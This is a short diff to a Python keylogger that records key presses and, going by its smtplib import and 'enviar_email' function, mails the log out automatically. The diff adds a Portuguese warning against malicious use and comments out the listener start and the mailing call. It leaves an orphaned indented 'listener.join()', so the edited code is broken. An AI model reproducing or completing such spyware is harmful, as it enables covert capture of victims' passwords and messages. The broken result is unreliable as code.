@@ -3,6 +3,8 @@ import smtplib
 from email.mime.text import MIMEText
 from threading import Timer
 
+# Não utilize este código para fins maliciosos e jamais o execute fora de uma máquina virtual. Algumas partes foram comentadas por questões de segurança.
+
 log = ""
 
 #Configurações de e-mail
@@ -45,6 +47,7 @@ def on_press(key):
 
 # Inicia o keylogger e o envio automático
 
-with keyboard.Listener(on_press=on_press) as listener:
-    enviar_email()
+#with keyboard.Listener(on_press=on_press) as listener:
+    #enviar_email()
+
     listener.join()
